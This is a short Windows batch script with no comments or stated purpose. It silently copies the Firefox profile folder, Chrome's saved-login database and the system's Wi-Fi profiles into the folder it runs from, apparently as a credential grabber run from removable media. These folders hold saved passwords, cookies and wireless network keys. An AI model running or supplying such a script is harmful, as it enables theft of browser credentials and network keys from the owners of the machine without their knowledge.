@echo off
xcopy "%userprofile%\AppData\Roaming\Mozilla\Firefox\profiles" "%cd%" /H /S /A
copy "%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%cd%"
xcopy "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces" "%cd%" /H /S /A
